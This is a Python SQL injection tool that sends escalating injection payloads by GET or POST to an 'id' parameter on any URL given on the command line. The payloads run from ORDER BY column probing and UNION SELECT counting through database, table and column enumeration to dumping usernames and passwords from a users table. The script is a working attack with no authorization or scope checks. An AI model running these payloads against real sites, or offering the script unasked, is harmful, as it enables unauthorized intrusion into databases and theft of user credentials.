#!/usr/bin/python3
"""
SQL Injection Tool - Multi-Method Version
"""

import requests
import sys

def test_sql_injection(url, payload, method="GET"):
    """Test a single payload"""
    try:
        if method == "GET":
            response = requests.get(f"{url}?id={payload}")
        elif method == "POST":
            response = requests.post(f"{url}", data={"id": payload})
        else:
            return {"payload": payload, "error": "Invalid method"}
            
        return {
            "payload": payload,
            "status_code": response.status_code,
            "response_length": len(response.text),
            "response_sample": response.text[:100] + "..." if len(response.text) > 100 else response.text
        }
    except Exception as e:
        return {
            "payload": payload,
            "error": str(e)
        }

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 script.py <target_url> <method:GET|POST>")
        sys.exit(1)
    
    url = sys.argv[1]
    method = sys.argv[2].upper()
    
    # Test payloads
    payloads = [
        "' order by 1", "' order by 2", "' order by 3", "' order by 4", "' order by 5", "' order by 6", "' order by 7", "' order by 8", "' order by 9", "' order by 10",
        "' union select 1", "' union select 1,2", "' union select 1,2,3", "' union select 1,2,3,4", "' union select 1,2,3,4,5", "' union select 1,2,3,4,5,6", "' union select 1,2,3,4,5,6,7", "' union select 1,2,3,4,5,6,7,8", "' union select 1,2,3,4,5,6,7,8,9", "' union select 1,2,3,4,5,6,7,8,9,10",
        "' union select database()", "' union select group_concat(table_name) from information_schema.tables where table_schema=database()",
        "' union select group_concat(column_name) from information_schema.columns where table_name='users'",
        "' union select username, password from users"
    ]
    
    for payload in payloads:
        result = test_sql_injection(url, payload, method)
        print(f"Payload: {result['payload']}")
        if "error" in result:
            print(f"Error: {result['error']}")
        else:
            print(f"Status: {result['status_code']} | Length: {result['response_length']} | Sample: {result['response_sample']}")
        print("-" * 50)

if __name__ == "__main__":
    main()
